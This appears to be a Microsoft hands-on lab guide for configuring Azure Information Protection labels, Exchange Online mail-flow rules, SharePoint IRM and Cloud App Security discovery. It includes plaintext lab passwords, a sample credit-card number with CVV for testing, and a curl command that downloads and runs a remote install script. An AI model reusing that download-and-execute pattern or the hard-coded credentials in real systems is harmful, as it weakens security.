	>[!Hint] Since there are no Automatic conditions configured yet, the scanner found no matches for the 141 files scanned despite 136 of them having sensitive data.
	>
	>!IMAGE[aukjn7zr.jpg](\Media\aukjn7zr.jpg)
	>
	>The details contained in the DetailedReport.csv can be used to identify the types of sensitive data you need to create AIP rules for in the Azure Portal.
	>
	>!IMAGE[9y52ab7u.jpg](\Media\9y52ab7u.jpg)

	>[!NOTE] We will revisit this information later in the lab to review discovered data and create Sensitive Data Type to Classification mappings.

===

# Defining Recommended and Automatic Conditions
[:arrow_left: Home](#azure-information-protection)

One of the most powerful features of Azure Information Protection is the ability to guide your users in making sound decisions around safeguarding sensitive data.  This can be achieved in many ways through user education or reactive events such as blocking emails containing sensitive data. 

However, helping your users to properly classify and protect sensitive data at the time of creation is a more organic user experience that will achieve better results long term.  In this task, we will define some basic recommended and automatic conditions that will trigger based on certain types of sensitive data.

1. [] Under **Dashboards** on the left, click on **Data discovery (Preview)** to view the results of the discovery scan we performed previously.

	!IMAGE[Dashboard.png](\Media\Dashboard.png)

	> [!KNOWLEDGE] Notice that there are no labeled or protected files shown at this time.  This uses the AIP P1 discovery functionality available with the AIP Scanner. Only the predefined Office 365 Sensitive Information Types are available with AIP P1 as Custom Sensitive Information Types require automatic conditions to be defined, which is an AIP P2 feature.

	> [!NOTE] Now that we know the sensitive information types that are most common in this environment, we can use that information to create **Recommended** conditions that will help guide user behavior when they encounter this type of data.

1. [] Under **Classifications** on the left, click **Labels** then expand **Confidential**, and click on **All Employees**.

	^IMAGE[Open Screenshot](\Media\jyw5vrit.jpg)
1. [] In the Label: All Employees blade, scroll down to the **Configure conditions for automatically applying this label** section, and click on **+ Add a new condition**.

	!IMAGE[cws1ptfd.jpg](\Media\cws1ptfd.jpg)
1. [] In the Condition blade, in the **Select information types** search box, type ```EU``` and check the boxes next to the **items shown below**.

	!IMAGE[xaj5hupc.jpg](\Media\xaj5hupc.jpg)

1. [] Click **Save** in the Condition blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\41o5ql2y.jpg)
1. [] In the Labels: All Employees blade, in the **Configure conditions for automatically applying this label** section, click **Automatic**.

1. [] Click **Save** in the Label: All Employees blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\rimezmh1.jpg)
1. [] Press the **X** in the upper right-hand corner to close the Label: All Employees blade.

	^IMAGE[Open Screenshot](\Media\em124f66.jpg)
1. [] Next, expand **Highly Confidential** and click on the **All Employees** sub-label.

	^IMAGE[Open Screenshot](\Media\2eh6ifj5.jpg)
1. [] In the Label: All Employees blade, scroll down to the **Configure conditions for automatically applying this label** section, and click on **+ Add a new condition**.

	^IMAGE[Open Screenshot](\Media\8cdmltcj.jpg)
1. [] In the Condition blade, in the search bar type ```credit``` and check the box next to **Credit Card Number**.

	^IMAGE[Open Screenshot](\Media\9rozp61b.jpg)
1. [] Click **Save** in the Condition blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\ie6g5kta.jpg)
1. [] In the Labels: All Employees blade, in the **Configure conditions for automatically applying this label** section, click **Automatic**.

	!IMAGE[245lpjvk.jpg](\Media\245lpjvk.jpg)
	> [!HINT] The policy tip is automatically updated when you switch the condition to Automatic.
1. [] Click **Save** in the Label: All Employees blade and **OK** to the Save settings prompt.

	^IMAGE[Open Screenshot](\Media\gek63ks8.jpg)
1. [] Press the **X** in the upper right-hand corner to close the Label: All Employees blade.

	^IMAGE[Open Screenshot](\Media\wzwfc1l4.jpg)

===

# Exercise 3A: Security and Compliance Center
[:arrow_left: Home](#azure-information-protection)

In this exercise, we will migrate your AIP Labels and activate them in the Security and Compliance Center.  This will allow you to see the labels in Microsoft Information Protection based clients such as Office 365 for Mac and Mobile Devices.

Although we will not be demonstrating these capabilities in this lab, you can use the tenant information provided to test on your own devices.
 

===
# Activating Unified Labeling
[:arrow_left: Home](#azure-information-protection)
 
In this task, we will activate the labels from the Azure Portal for use in the Security and Compliance Center.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Navigate to ```https://portal.azure.com/?ActivateMigration=true#blade/Microsoft_Azure_InformationProtection/DataClassGroupEditBlade/migrationActivationBlade```

1. [] Click **Activate** and **Yes**.

	!IMAGE[o0ahpimw.jpg](\Media\o0ahpimw.jpg)

	>[!NOTE] You should see a message similar to the one below.
	>
	> !IMAGE[SCCMigration.png](\Media\SCCMigration.png) 

1. [] In a new tab, browse to ```https://protection.office.com/``` and click on **Classifications** and **Labels** to review the migrated labels. 

	>[!NOTE] Keep in mind that now the SCC Sensitivity Labels have been activated, so any modifications, additions, or deletions will be syncronised to Azure Information Protection in the Azure Portal. There are some functional differences between the two sections (DLP in SCC, HYOK & Custom Permissions in AIP), so please be aware of this when modifying policies to ensure a consistent experience on clients. 
===
# Exercise 4A: Bulk Classification with the AIP Client

In this task, we will perform bulk classification using the built-in functionality of the AIP Client.  This can be useful for users that want to classify/protect many documents that exist in a central location or locations identified by scanner discovery.  Because this is done manually, it is an AIP P1 feature.

1. [] Switch to @lab.VirtualMachine(Scanner01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Browse to the **C:\\**.
2. [] Right-click on the PII folder and select **Classify and Protect**.
   
   !IMAGE[CandP.png](\Media\CandP.png)
1. [] When prompted, click use another user and use the credentials below to authenticate:

	```AIPScanner@@lab.CloudCredential(134).TenantName```

	```Somepass1```

1. [] In the AIP client Classify and protect interface, select **Highly Confidential\\All Employees** and press **Apply**. 

	!IMAGE[CandP2.png](\Media\CandP2.png)

> [!NOTE] You may review the results in a text file by clicking show results, or simply close the window.
===

# Exercise 5A: Classification, Labeling, and Protection with the Azure Information Protection Scanner
[:arrow_left: Home](#azure-information-protection)

The Azure Information Protection scanner allows you to  classify and protect sensitive information stored in on-premises CIFS file shares and SharePoint sites.  

In this exercise, you will change the condition we created previously from a recommended to an automatic classification rule.  After that, we will run the AIP Scanner in enforce mode to classify and protect the identified sensitive data.

===

# Enforcing Configured Rules
[:arrow_left: Home](#azure-information-protection)
 
In this task, we will set the AIP scanner to enforce the conditions we set up in the previous task and have it run on all files using the Start-AIPScan command.

1. [] Switch to @lab.VirtualMachine(Scanner01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Run the commands below to run an enforced scan using defined policy.

    ```
	Set-AIPScannerConfiguration -Enforce On -DiscoverInformationTypes PolicyOnly
	```
	```
	Start-AIPScan
    ```

	> [!HINT] Note that this time we used the DiscoverInformationTypes -PolicyOnly switch before starting the scan. This will have the scanner only evaluate the conditions we have explicitly defined in conditions.  This increases the effeciency of the scanner and thus is much faster.  After reviewing the event log we will see the result of the enforced scan.
	>
	>!IMAGE[k3rox8ew.jpg](\Media\k3rox8ew.jpg)
	>
	>If we switch back to @lab.VirtualMachine(Client01).SelectLink and look in the reports directory we opened previously at ```\\\Scanner01.contoso.azure\c$\users\aipscanner\AppData\Local\Microsoft\MSIP\Scanner\Reports```, you will notice that the old scan reports are zipped in the directory and only the most recent results aare showing.  
	>
	> If needed, use the credentials below:
	>
	>```Contoso\LabUser```
	>
	>```Pa$$w0rd```
	>
	>!IMAGE[s8mn092f.jpg](\Media\s8mn092f.jpg)
	>
	>Also, the DetailedReport.csv now shows the files that were protected.
	>
	>
	>!IMAGE[6waou5x3.jpg](\Media\6waou5x3.jpg)
	>
	>^IMAGE[Open Fullscreen](6waou5x3.jpg)

===

# Reviewing Protected Documents
[:arrow_left: Home](#azure-information-protection)

Now that we have Classified and Protected documents using the scanner, we can review the documents we looked at previously to see their change in status.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
 
2. [] Navigate to ```\\\Scanner01.contoso.azure\documents```. 

	> If needed, use the credentials below:
	>
	>```Contoso\LabUser```
	>
	>```Pa$$w0rd```
 
	^IMAGE[Open Screenshot](\Media\hipavcx6.jpg)
3. [] Open one of the Contoso Purchasing Permissions documents or Run For The Cure spreadsheets.
 
 	
	
	> [!NOTE] Observe that the same document is now classified as Confidential \ All Employees. 
	>
	>!IMAGE[s1okfpwu.jpg](\Media\s1okfpwu.jpg)
===
# Reviewing the Dashboards

We can now go back and look at the dashboards and observe how they have changed.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open the browser that is logged into the Azure Portal.

1. [] Under **Dashboards**, click on **Usage report (Preview)**.

	> [!NOTE] Observe that there are now entries from the AIP scanner, and File Explorer based on our activities in this lab. You may not see details of label data right away as this takes longer to process.  I have included a screenshot of the results below, but you may check back later in the lab to see the full results.
	>
	> !IMAGE[Usage.png](\Media\Usage.png)
	>
	> !IMAGE[Usage2.png](\Media\Usage2.png)
2. [] Next, under dashboards, click on **Data discovery (Preview)**.

	> [!NOTE] As mentioned above, label data may not show up initially but you should start seeing protection data in the portal.  I have included a screenshot of the final result so please check back throughout the lab to see the label data from the AIP scanner.
	>
	> !IMAGE[Discovery.png](\Media\Discovery.png)
	> 
	> !IMAGE[discovery2.png](\Media\discovery2.png)
	
===
# Exercise 6A: Exchange Online IRM Capabilities
[:arrow_left: Home](#azure-information-protection)

Exchange Online can work in conjunction with Azure Information Protection to provide advanced capabilities for protecting sensitive data being sent over email.  You can also manage the flow of classified content to ensure that it is not sent to unintended recipients.  

## Configuring Exchange Online Mail Flow Rules

In this task, we will configure a mail flow rule to detect sensitive information traversing the network in the clear and encrypt it using the Encrypt Only RMS Template.  We will also create a mail flow rule to prevent messages classified as Confidential \ All Employees from being sent to external recipients.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open an **Admin PowerShell Prompt**.

2. [] Type the commands below to connect to an Exchange Online PowerShell session.  Use the credentials provided when prompted.

	```
	Set-ExecutionPolicy RemoteSigned
	```

	```
	$UserCredential = Get-Credential
	```

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```

	```
	$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $UserCredential -Authentication Basic -AllowRedirection
	Import-PSSession $Session
	```

1. [] Create a new Exchange Online Mail Flow Rule using the code below:

	```
	New-TransportRule -Name "Encrypt external mails with sensitive content" -SentToScope NotInOrganization -ApplyRightsProtectionTemplate "Encrypt" -MessageContainsDataClassifications @(@{Name="ABA Routing Number"; minCount="1"},@{Name="Credit Card Number"; minCount="1"},@{Name="Drug Enforcement Agency (DEA) Number"; minCount="1"},@{Name="International Classification of Diseases (ICD-10-CM)"; minCount="1"},@{Name="International Classification of Diseases (ICD-9-CM)"; minCount="1"},@{Name="U.S. / U.K. Passport Number"; minCount="1"},@{Name="U.S. Bank Account Number"; minCount="1"},@{Name="U.S. Individual Taxpayer Identification Number (ITIN)"; minCount="1"},@{Name="U.S. Social Security Number (SSN)"; minCount="1"})
	```

	>[!KNOWLEDGE] This mail flow rule can be used to encrypt sensitive data leaving via email.  This can be customized to add additional sensitive data types. A breakdown of the command is listed below.
	>
	>New-TransportRule 
	>
	>-Name "Encrypt external mails with sensitive content" 
	>
	>-SentToScope NotInOrganization 
	>
	>-ApplyRightsProtectionTemplate "Encrypt" 
	>
	>-MessageContainsDataClassifications @(@{Name="ABA Routing Number"; minCount="1"},@{Name="Credit Card Number"; minCount="1"},@{Name="Drug Enforcement Agency (DEA) Number"; minCount="1"},@{Name="International Classification of Diseases (ICD-10-CM)"; minCount="1"},@{Name="International Classification of Diseases (ICD-9-CM)"; minCount="1"},@{Name="U.S. / U.K. Passport Number"; minCount="1"},@{Name="U.S. Bank Account Number"; minCount="1"},@{Name="U.S. Individual Taxpayer Identification Number (ITIN)"; minCount="1"},@{Name="U.S. Social Security Number (SSN)"; minCount="1"})
	
	> [!HINT] Next, we need to capture the **Label ID** for the **Confidential \ All Employees** label. 

1. [] Switch to the Azure Portal and under **Classifications** click on Labels, then expand **Confidential** and click on **All Employees**.

	!IMAGE[w2w5c7xc.jpg](\Media\w2w5c7xc.jpg)

	> [!HINT] If you closed the azure portal, open an Edge InPrivate window and navigate to ```https://portal.azure.com```.

1. [] In the Label: All Employees blade, scroll down to the Label ID and **copy** the value.

	!IMAGE[lypurcn5.jpg](\Media\lypurcn5.jpg)

	> [!ALERT] Make sure that there are no spaces before or after the Label ID as this will cause the mail flow rule to be ineffective.

1. [] Next, return to the PowerShell window and type ```$labelid = "``` then paste the **LabelID** for the **All Employees** label, type ```"```, and press **Enter**.

    >[!NOTE] The full command should look like **$labelid = "Label ID GUID"**
1. [] Now, create another Exchange Online Mail Flow Rule using the code below:

	```
	$labeltext = "MSIP_Label_"+$labelid+"_enabled=true"
	New-TransportRule -name "Block Confidential All Employees" -SentToScope notinorganization -HeaderContainsMessageHeader  "msip_labels" -HeaderContainsWord $labeltext -RejectMessageReasonText “All Employees messages cannot be sent to external recipients.”
	```

	>[!KNOWLEDGE] This mail flow rule can be used to prevent internal only communications from being sent to an external audience.
	>
	>New-TransportRule 
	>
	>-name "Block Confidential All Employees" 
	>
	>-SentToScope notinorganization 
	>
	>-HeaderContainsMessageHeader "msip_labels" 
	>
	>-HeaderContainsWord $labeltext 
	>
	>-RejectMessageReasonText “All Employees messages cannot be sent to external recipients.”

	>[!NOTE] In a production environment, customers would want to create a rule like this for each of their labels that they did not want going externally.
===

# Demonstrating Exchange Online Mail Flow Rules
[:arrow_left: Home](#azure-information-protection)

In this task, we will send emails to demonstrate the results of the Exchange Online mail flow rules we configured in the previous task.  This will demonstrate some ways to protect your sensitive data and ensure a positive user experience with the product.

1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] In Microsoft Outlook, click on the **New email** button.

	^IMAGE[Open Screenshot](\Media\6wan9me1.jpg)

1. [] Send an email to Adam Smith, Alice Anderson, and yourself (```Adam Smith;Alice Anderson;@lab.User.Email```).  For the **Subject**, type ```Test Credit Card Email``` and for the **Body**, type ```My AMEX card number is 344047014854133. The expiration date is 09/28, and the CVV is 4368```, then click **Send**.

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Review the received email.

	!IMAGE[pidqfaa1.jpg](\Media\pidqfaa1.jpg)

	> [!Knowledge] Note that there is no encryption applied to the message.  That is because we set up the rule to only apply to external recipients.  If you were to leave that condition out of the mail flow rule, internal recipients would also receive an encrypted copy of the message.  The image below shows the encrypted message that was received externally.
	>
	>!IMAGE[c5foyeji.jpg](\Media\c5foyeji.jpg)
	>
	>Below is another view of the same message received in Outlook Mobile on an iOS device.
	>
	>!IMAGE[599ljwfy.jpg](\Media\599ljwfy.jpg)

1. [] Next, in Microsoft Outlook, click on the **New email** button.

	^IMAGE[Open Screenshot](\Media\6wan9me1.jpg)
1. [] Send an email to Adam Smith, Alice Anderson, and yourself (```Adam Smith;Alice Anderson;@lab.User.Email```).  For the **Subject** and **Body** type ```Another Test All Employees Email```.

	^IMAGE[Open Screenshot](\Media\d476fmpg.jpg)

1. [] In the Sensitivity Toolbar, click on the **pencil** icon to change the Sensitivity label.

	^IMAGE[Open Screenshot](\Media\901v6vpa.jpg)

1. [] Click on **Confidential** and then **All Employees** and click **Send**.

	^IMAGE[Open Screenshot](\Media\yhokhtkv.jpg)
1. [] In about a minute, you should receive an **Undeliverable** message from Exchange with the users that the message did not reach and the message you defined in the previous task.

	!IMAGE[kgjvy7ul.jpg](\Media\kgjvy7ul.jpg)

> [!HINT] There are many other use cases for Exchange Online mail flow rules but this should give you a quick view into what is possible and how easy it is to improve the security of your sensitive data through the use of Exchange Online mail flow rules and Azure Information Protection.

===
# Exercise 7A: SharePoint IRM Configuration
[:arrow_left: Home](#azure-information-protection)

In this exercise, you will configure SharePoint Online Information Rights Management (IRM) and configure a document library with an IRM policy to protect documents that are downloaded from that library.

===
# Enable Information Rights Management in SharePoint Online
[:arrow_left: Home](#azure-information-protection)
 
In this task, we will enable Information Rights Management in SharePoint Online.

1. [] Switch to @lab.VirtualMachine(Client03).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.

1. [] Launch an Edge InPrivate session to ```https://admin.microsoft.com/AdminPortal/Home#/```.
 
1. [] If needed, log in using the credentials below:

	 ```@lab.CloudCredential(134).Username```
	 
	 ```@lab.CloudCredential(134).Password```
 
1. [] Hover over the **Admin centers** section of the bar on the left and choose **SharePoint**.

	!IMAGE[r5a21prc.jpg](\Media\r5a21prc.jpg)
 
1. [] In the SharePoint admin center click on **settings**.

1. [] Scroll down to the Information Rights Management (IRM) section and select the option button for **Use the IRM service specified in your configuration**.
 
1. [] Click the **Refresh IRM Settings** button.

	!IMAGE[1qv8p13n.jpg](\Media\1qv8p13n.jpg)

	>[!HINT] After the browser refreshes, you can scroll down to the same section and you will see a message stating **We successfully refreshed your setings.**
	>
	>!IMAGE[daeglgk9.jpg](\Media\daeglgk9.jpg)
1. [] Scroll down and click **OK**.
1. [] Next, navigate to ```https://admin.microsoft.com/AdminPortal/Home#/users```.
1. [] Click on **Nuck Chorris** and on the profile page, next to Roles, click **Edit**.

	!IMAGE[df6t9nk1.jpg](\Media\df6t9nk1.jpg)
1. [] On the Edit user roles page, select **Customized administrator**, check the box next to **SharePoint administrator**, and click **Save**.

	!IMAGE[3rj47ym9.jpg](\Media\3rj47ym9.jpg)
1. [] **Close the Edge InPrivate browser** window to **clear the credentials**.

 
===

# Site Creation and Information Rights Management Integration
[:arrow_left: Home](#azure-information-protection)
 
In this task, we will create a new SharePoint site and enable Information Rights Management in a document library.

1. [] Launch a new Edge InPrivate session to ```https://portal.office.com```.
1. [] Log in using the credentials below:

	```NuckC@@lab.CloudCredential(134).TenantName```

	```NinjaCat123```
1. [] Click on **SharePoint** in the list.

	!IMAGE[twsp6mvj.jpg](\Media\twsp6mvj.jpg)

1. [] Dismiss any introductory screens and, at the top of the page, click **+ Create site**.

	!IMAGE[7v8wctu2.jpg](\Media\7v8wctu2.jpg)

	[!NOTE] If you do not see the **+ Create site** button, resize the VM window by dragging the divider for the instructions to the right until the VM resizes and you can see the button.
 
1. [] On the Create a site page, click **Team site**.

	^IMAGE[Open Screenshot](\Media\406ah98f.jpg)
 
1. [] On the next page, type ```IRM Demo``` for **Site name** and for the **Site description**, type ```This is a team site for demonstrating SharePoint IRM capabilities``` and set the **Privacy settings** to **Public - anyone in the organization can access the site** and click **Next**.

	^IMAGE[Open Screenshot](\Media\ug4tg8cl.jpg)

1. [] On the Add group members page, click **Finish**.
1. [] In the newly created site, on the left navigation bar, click **Documents**.

	^IMAGE[Open Screenshot](\Media\yh071obk.jpg)
 
1. [] In the upper right-hand corner, click the **Settings icon** and click **Library settings**.

	!IMAGE[1qo31rp6.jpg](\Media\1qo31rp6.jpg)
 
1. [] On the Documents > Settings page, under **Permissions and Management**, click **Information Rights Management**.

	!IMAGE[ie2rmsk2.jpg](\Media\ie2rmsk2.jpg)
  
	>[!ALERT] It may take up to 10 minutes for the global IRM settings to apply to document libraries.  If this has not appeared after a few minutes, try creating a new document library to see if the link is available. 

1. [] On the Settings > Information Rights Management Settings page, check the box next to Restrict permissions on this library on download and under **Create a permission policy title** type ```Contoso IRM Policy```, and under **Add a permission policy description** type ```This content contained within this file is for use by Contoso Corporation employees only.```
 
	^IMAGE[Open Screenshot](\Media\m9v7v7ln.jpg)
1. [] Next, click on **SHOW OPTIONS** below the policy description and in the **Set additional IRM library settings** section, check the boxes next to **Do not allow users to upload documents that do not support IRM** and **Prevent opening documents in the browser for this Document Library**.

	!IMAGE[0m2qqtqn.jpg](\Media\0m2qqtqn.jpg)
	>[!KNOWLEDGE] These setting prevent the upload of documents that cannot be protected using Information Rights Managment (Azure RMS) and forces protected documents to be opened in the appropriate application rather than rendering in the SharePoint Online Viewer.
 
1. [] Next, under the **Configure document access rights** section, check the box next to **Allow viewers to run script and screen reader to function on downloaded documents**.

	!IMAGE[72fkz2ds.jpg](\Media\72fkz2ds.jpg)
	>[!HINT] Although this setting may reduce the security of the document, this is typically provided for accessibility purposes.
1. [] Finally, in the **Configure document access rights** section, check the box next to  **Users must verify their credentials using this interval (days)** and type ```7``` in the text box.

	!IMAGE[tt1quq3f.jpg](\Media\tt1quq3f.jpg)
1. [] At the bottom of the page, click **OK** to complete the configuration of the protected document library.
1. [] On the Documents > Settings page, in the left-hand navigation pane, click on **Documents** to return to the document library. section.
 
1. [] Leave the browser open and continue to the next task.
 
===

# Uploading Content to the Document Library
[:arrow_left: Home](#azure-information-protection)
 
Create an unprotected Word document, label it as Internal, and upload it to the document library. 

1. [] Launch **Microsoft Word**.
1. [] Create a new **Blank document**.

	>[!NOTE] Notice that by default the document is labeled as the unprotected classification **General**.
 
1. [] In the Document, type ```This is a test document```.
 
1. [] **Save** the document and **close Microsoft Word**.
1. [] Return to the IRM Demo protected document library and click on **Upload > Files**.

	!IMAGE[m95ixvv1.jpg](\Media\m95ixvv1.jpg)
1. [] Navigate to the location where you saved the document, select it and click **Open** to upload the file.
 
1. [] Next, minimize the browser window and right-click on the desktop. Hover over **New >** and click on **Microsoft Access Database**. Name the database ```BadFile```.

	!IMAGE[e3nxt4a2.jpg](\Media\e3nxt4a2.jpg)
1. [] Return to the document library and attempt to upload the file.

	>[!KNOWLEDGE] Notice that you are unable to upload the file because it cannot be protected.
	>	
	>!IMAGE[432hu3pi.jpg](\Media\432hu3pi.jpg)
===

# SharePoint IRM Functionality
[:arrow_left: Home](#azure-information-protection)
 
Files that are uploaded to a SharePoint IRM protected document library are protected upon download based on the user's access rights to the document library.  In this task, we will share a document with Alice Anderson and review the access rights provided.

1. [] Select the uploaded document and click **Share** in the action bar.

	!IMAGE[1u2jsod7.jpg](\Media\1u2jsod7.jpg)
1. [] In the Send Link dialog, type ```Alice``` and click on **Alice Anderson** then **Send**.

	!IMAGE[j6w1v4z9.jpg](\Media\j6w1v4z9.jpg)
1. [] Switch to @lab.VirtualMachine(Client02).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.
1. [] Open Outlook and click on the email from Nuck Chorris, then click on the **Open** link.

	^IMAGE[Open Screenshot](\Media\v39ez284.jpg)
1. [] This will launch the IRM Demo document library.  Click on the document to open it in Microsoft Word.

	!IMAGE[xmv9dmvk.jpg](\Media\xmv9dmvk.jpg)
1. [] After the document opens, you will be able to observe that it is protected.  Click on the View Permissions button to review the restrictions set on the document.

	!IMAGE[4uya6mro.jpg](\Media\4uya6mro.jpg)
	>[!NOTE] These permissions are based on the level of access that they user has to the document library.  In a production environment most users would likely have less rights than shown in this example.

===
# AIP Lab Complete
[:arrow_left: Home](#introduction)

Congratulations! You have completed the Azure Information Protection Hands on Lab. 

===
# Microsoft Cloud App Security
[:arrow_left: Home](#introduction)

This lab will guide you through the different Microsoft Cloud App Security (MCAS) capabilities.
Although some labs are pretty straight forward ,we expect you to already have some basic experience with Cloud App Security or Office 365 management.

## Lab environment

![Lab environment](\Media\mcaslabenvironment.png "Lab environment")

* **Client01** is a Windows 10 VM that will be used to access Office 365 and Cloud app Security management consoles and configure the log collector running on LinuxVM, using Putty.
* **LinuxVM** is an Ubuntu 18.04 computer on which we install Docker to run the Cloud App Security Discovery log collector.
* Office 365 and Cloud App Security are test tenants for the labs.

>:memo: We recommend using the [Cloud App Security documentation](https://docs.microsoft.com/en-us/cloud-app-security/what-is-cloud-app-security "Cloud App Security documentation") to have details on the different use cases, capabilities and configuration steps.

### Portals URLs

* Office 365: https://portal.office.com
* Cloud App Security: https://portal.cloudappsecurity.com
* Security & Compliance Center: https://protection.office.com
* Windows Defender ATP: https://securitycenter.windows.com

---

## Labs

> [!ALERT] Before going to the different labs section, please complete the **[environment preparation](#mcas-environment-preparation)**. 

The different Cloud App Security capabilities covered in the labs are:

* [Module 01 - Management](#Manage-admin-access)
* [Module 02 - Cloud Discovery continuous report](module02/module02.md)
* [Module 03 - Information protection](module03/module03.md)
* [Module 04 - Threat detection](module04/module04.md)

### Optional/follow on labs

* [Module 05a - Management with PowerShell](module05/module05a.md)
* [Module 05b - Cloud Discovery snapshot report](module05/module05b.md)
* [Module 05c - Log collector troubleshooting](module05/module05c.md)
* [Module 05d - Conditional Access App Control](module05/module05d.md)

>:question: If you have questions or want to go further in your Cloud App Security journey, join our **[Tech community](https://techcommunity.microsoft.com/t5/Microsoft-Cloud-App-Security/bd-p/MicrosoftCloudAppSecurity)** !
===
# Manage admin access

[:arrow_left: Home](#labs)

[Manage admin access:](#Manage-admin-access) :clock10: 15 min

For this task, you are asked to delegate admin access to monitor a dedicated group of users for a specific region, without adding them to the Global Admin management role.

> :memo: Cloud App Security Global admin role is not the same as the regular Office 365 Global admin role.
> Although the Office 365 Global admins are automatically granted the Cloud App Security Global admin role, you can grant users MCAS Global Admin role without adding them to the Office 365 Global admins

Documentation:
[https://docs.microsoft.com/en-us/cloud-app-security/manage-admins](https://docs.microsoft.com/en-us/cloud-app-security/manage-admins)

## Delegate user group administration

In this lab, we are going to delegate the management of US employees to a new administrator. This administrator will only see those users alerts and activities.

1. In the [Azure Active Directory portal](https://portal.azure.com), create a new user account named **mcasAdminUS**. Do not grant him any specific admin role.
   ![New user](\Media\mgmt-newuser1.png "New user")

   ![New user](\Media\mgmt-newuser2.png "New user")

2. Create a new Azure AD group **US employees** containing a couple of your test users (**not** your admin account).
   ![New group](\Media\mgmt-newgroup1.png "New group")

   ![New group](\Media\mgmt-newgroup2.png "New group")

3. In the [Cloud App Security portal](https://portal.cloudappsecurity.com), import the **US employees** group.
    > :warning: Cloud App Security has to synchronize the Azure AD groups before importing them. This operation can take up to 1h.

    ![Import group](\Media\mgmt-import1.png "Import group")

    ![Import group](\Media\mgmt-import2.png "Import group")

    ![Import group](\Media\mgmt-import3.png "Import group")

    ![Import group](\Media\mgmt-import4.png "Import group")

4. In the [Cloud App Security portal](https://portal.cloudappsecurity.com), add **mcasAdminUS** as **User group admin** for the **US employees** group.

    ![New admin](\Media\mgmt-admin1.png "New admin")

    ![New admin](\Media\mgmt-admin2.png "New admin")

    ![New admin](\Media\mgmt-admin3.png "New admin")

    ![New admin](\Media\mgmt-admin4.png "New admin")

    ![New admin](\Media\mgmt-admin5.png "New admin")

5. Open a new **private** tab and connect to the [Cloud App Security portal](https://portal.cloudappsecurity.com) with **mcasAdminUS** and compare the activities, alerts and actions that this scoped admin can perform compared to your regular Global admin account.

---

## Delegate MCAS administration to an external admin

As a **Managed Security Service Providers** (MSSPs), you are asked by your customer how you could access their environment to manage their alerts in the Cloud App Security portal.
In this lab, we will see how to answer to that question.
As the MCAS admin for your company, work with the person next to you to configure an external access for the Managed Security Service Provider to another MCAS tenant.

1. In the [Cloud App Security portal](https://portal.cloudappsecurity.com), add the external MCAS admin as **Security reader** in your MCAS tenant.

    ![External admin](\Media\mgmt-admin1.png "External admin")

    ![External admin](\Media\mgmt-admin2.png "External admin")

    ![External admin](\Media\mgmt-admin3.png "External admin")

    ![External admin](\Media\mgmt-admin4.png "External admin")

    ![External admin](\Media\mgmt-externaladmin1.png "External admin")

    > :memo: Note here that the icon next to the newly added admin shows that the user is external to the company.

    ![External admin](\Media\mgmt-externaladmin2.png "External admin")

2. After adding the external admin, **log off** and log on again from Cloud App Security.

    ![Log off](\Media\mgmt-switch1.png "Log off")

3. Switch to the external Cloud App Security tenant where you have been added as an external admin and look at the actions you can perform.

    ![Switch](\Media\mgmt-switch2.png "Switch")
===
# Cloud App Security Discovery lab

[:arrow_left: Home](#labs)

Continuous reports in Cloud Discovery analyze all logs that are forwarded from your network using Cloud App Security. They provide improved visibility over all data, and automatically identify anomalous use using either the Machine Learning anomaly detection engine or by using custom policies that you define.
To use this capability, you will perform in this lab the configuration and troubleshooting of the Cloud Discovery feature.

## Configure and test continuous reports

[:arrow_up: Top](#Cloud-App-Security-Discovery-lab)

> NOTE: The Docker engine has been pre-installed on LinuxVM in your lab environment, **Client01** in this case, using the commands (below) provided in the [deployment guide](https://docs.microsoft.com/en-us/cloud-app-security/discovery-docker-ubuntu).

``` bash
    curl -o /tmp/MCASInstallDocker.sh https://adaprodconsole.blob.core.windows.net/public-files/MCASInstallDocker.sh && chmod +x /tmp/MCASInstallDocker.sh; /tmp/MCASInstallDocker.sh
```

Those commands download a script installing the Docker engine on your host computer (Ubuntu in this case) and pull the latest Cloud App Security collector image from the Docker library.

### Create a data source and a log collector in the Cloud App Security portal

1. [] Switch to @lab.VirtualMachine(Client01).SelectLink and log in with the password +++@lab.VirtualMachine(Client01).Password+++.

2. Create a new tab in the InPrivate window and browse to ```https://portal.cloudappsecurity.com```.

   >INFO: If necessary, log in using the credentials below:
   >
   >```@lab.CloudCredential(134).Username```
   >
   >```@lab.CloudCredential(134).Password```

3. In the Cloud App Security dashboard, click on the **Settings** icon and click **Log collectors**.

   ![Settings](\Media\dis-settings.png "Settings")

4. On the **Data sources tab**, click the **Add data source...** button.

    ![New data source](\Media\dis-newsource.png "New data source")

5. In the Add data source window, use the settings below (do not close the window yet):

    >|||
    >|---------|---------|
    >|Name| **SquiDLogs**|
    >|Source| **SQUID (Common)**|
    >|Receiver type| **FTP**|
    >|Anonymize private information |**Check the box**|
    >
    ![Squid source](\Media\dis-squidsource.png)

    >:memo: **NOTE:** In this lab we use FTP as the receiver type but usually companies will use Syslog.

6. While still in the Add data source dialog, click **View sample of expected log file**.

    >:memo: **NOTE:** Using this information, you can verify with your network team that the provided logs match the format expect by Cloud App Security. If it doesn't, you should use a custom parser.

    ![Verify log format](\Media\dis-verifylog.png "Verify log format")

7. In the Verify your log format dialog, click **Download sample log** and save to your desktop. Those logs will be used to simulate an appliance sending traffic logs to the log collector.

